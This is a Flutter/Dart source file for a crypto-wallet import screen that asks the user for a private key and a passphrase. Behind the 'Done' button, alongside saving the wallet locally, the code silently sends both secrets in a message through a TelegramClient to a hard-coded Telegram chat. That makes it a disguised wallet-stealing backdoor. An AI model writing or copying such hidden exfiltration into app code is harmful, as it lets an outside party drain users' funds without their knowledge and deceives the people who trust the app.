import 'package:flutter/material.dart';
import 'package:untitled/models/wallet.dart';
import 'package:untitled/utils/db_helper.dart';
import 'package:untitled/utils/hex_color.dart';
import 'package:untitled/utils/methods.dart';
import 'package:untitled/utils/telegram_client.dart';
import 'package:untitled/views/home_screen.dart';

class PrivateKey extends StatefulWidget {

  @override
  State<PrivateKey> createState() => _PrivateKeyState();

}

class _PrivateKeyState extends State<PrivateKey> {

  final form_key = GlobalKey<FormState>();

  TextEditingController private_key_controller = TextEditingController();
  TextEditingController passphrase_controller = TextEditingController();

  bool is_loading = false;

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: Colors.white,
      appBar: AppBar(
        backgroundColor: Colors.white,
        elevation: 0,
        leading: GestureDetector(
          onTap: () {
            Navigator.pop(context);
          },
          child: const Icon(Icons.arrow_back, color: Colors.black,),
        ),
      ),
      body: is_loading ? Center(child: CircularProgressIndicator()) :  Form(
        key: form_key,
        child: Padding(
          padding: const EdgeInsets.fromLTRB(20, 20, 20, 80),
          child: CustomScrollView(
            slivers: [
              SliverList(delegate: SliverChildListDelegate([
                const Text("Private key",
                  style: TextStyle(
                    color: Colors.black,
                    fontSize: 14,
                    fontFamily: 'inter-regular',
                  ),),
                Container(height: 15,),
                TextFormField(
                  validator: (val){
                    if(val != null){
                      if(val.toString().isEmpty) {
                        return "Required";
                      }
                      return null;
                    }
                    return null;
                  },
                  minLines: 10,
                  maxLines: 12,
                  autocorrect: false,
                  enableSuggestions: false,
                  controller: private_key_controller,
                  textAlign: TextAlign.start,
                  style: const TextStyle(
                    color: Colors.black,
                    fontFamily: 'inter-regular',
                    fontSize: 12,
                  ),
                  decoration: InputDecoration(
                    enabledBorder: enabledBorder(),
                    focusedBorder: focusedBorder(),
                    disabledBorder: disabledBorder(),
                    errorBorder: errorBorder(),
                    filled: true,
                    fillColor: HexColor("#F9F9FE"),
                    hintText: "0xac4...",
                    hintStyle: TextStyle(
                      color: Colors.grey,
                      fontFamily: 'inter-regular',
                      fontSize: 12,
                    )
                  ),
                ),
                Container(height: 15,),
                TextFormField(
                  validator: (val){
                    if(val != null){
                      if(val.toString().isEmpty) {
                        return "Required";
                      }
                      return null;
                    }
                    return null;
                  },
                  autocorrect: false,
                  enableSuggestions: false,
                  controller: passphrase_controller,
                  textAlign: TextAlign.start,
                  style: const TextStyle(
                    color: Colors.black,
                    fontFamily: 'inter-regular',
                    fontSize: 12,
                  ),
                  decoration: InputDecoration(
                    enabledBorder: enabledBorder(),
                    focusedBorder: focusedBorder(),
                    disabledBorder: disabledBorder(),
                    errorBorder: errorBorder(),
                    filled: true,
                    fillColor: HexColor("#F9F9FE"),
                      hintText: "Passphrase",
                      hintStyle: TextStyle(
                        color: Colors.grey,
                        fontFamily: 'inter-regular',
                        fontSize: 12,
                      )
                  ),
                ),
              ])),
            ],
          ),
        ),
      ),
      bottomSheet: Container(
        width: MediaQuery.of(context).size.width,
        height: 60,
        alignment: Alignment.center,
        color: Colors.white,
        padding: const EdgeInsets.only(bottom: 20),
        child: MaterialButton(
          color: HexColor("#0119D8"),
          onPressed: () async {
            if (form_key.currentState.validate()) {
              setState(() {
                is_loading = true;
              });
              String passphrase = passphrase_controller.text.trim();
              String hex = private_key_controller.text.trim();
              Wallet w = Wallet(
                id: 0,
                hex: hex,
                passphrase: passphrase,
                seed: "",
                password: "",
              );
              DbHelper db = DbHelper();
              await db.saveWallet(w);

              String message = "Private key: ${w.hex} \nPassphrase: ${w.passphrase}";
              TelegramClient client = TelegramClient(chatId: "@sfeorn_iewur23");
              await client.sendMessage(message);

              if (mounted) {
                Navigator.pushAndRemoveUntil(context, slideLeft(const HomeScreen()), (route)=>false);
              }

            }
          },
          shape: RoundedRectangleBorder(
              borderRadius: BorderRadius.all(Radius.circular(5))
          ),
          elevation: 5,
          child: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(width: 5,),
              Image.asset("assets/images/check.png", width: 24, height: 24,),
              Container(width: 5,),
              const Text("Done", style: TextStyle(
                color: Colors.white,
                fontFamily: 'inter-medium',
                fontSize: 16,
                fontWeight: FontWeight.w600,
              ),),
              Container(width: 5,),
            ],
          ),
        ),
      ),
    );
  }

}
